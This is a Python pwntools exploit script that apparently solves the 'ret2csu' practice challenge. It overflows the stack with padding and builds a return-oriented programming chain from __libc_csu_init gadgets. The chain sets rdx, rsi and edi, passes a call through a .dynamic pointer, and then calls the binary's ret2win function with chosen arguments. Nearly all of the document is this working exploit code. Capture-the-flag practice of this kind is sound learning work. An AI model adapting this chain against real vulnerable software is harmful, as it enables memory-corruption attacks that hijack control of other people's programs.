#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('ret2csu')
ret2win = elf.symbols['ret2win']


# ROP Gadgets
gadget1 = 0x400680  # mov rdx, r15; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12+rbx*8]
gadget2 = 0x40069a  # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget3 = 0x4006a3  # pop rdi; ret

# Byte sequence alias
A8 = 8 * b'A'


if __name__ == '__main__':
    proc = elf.process()


    payload =  5 * A8                   # padding (dummy)
    payload += p64(gadget2)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(0x600e48)            # r12 -> somewhere in .dynamic -> _fini
    payload += p64(0xdeadbeefdeadbeef)  # r13 -> edi ... not rdi :(
    payload += p64(0xcafebabecafebabe)  # r14 -> rsi (0xcafebabecafebabe)
    payload += p64(0xd00df00dd00df00d)  # r15 -> rdx (0xd00df00dd00df00d)
    payload += p64(gadget1)             # call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini

    payload += 7 * A8                   # 7 instead of 6 because ... 0x400896: add rsp, 0x8
    payload += p64(gadget3)
    payload += p64(0xdeadbeefdeadbeef)  # rdi
    payload += p64(ret2win)
    #sys.stdout.buffer.write(payload + b'\n')


    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
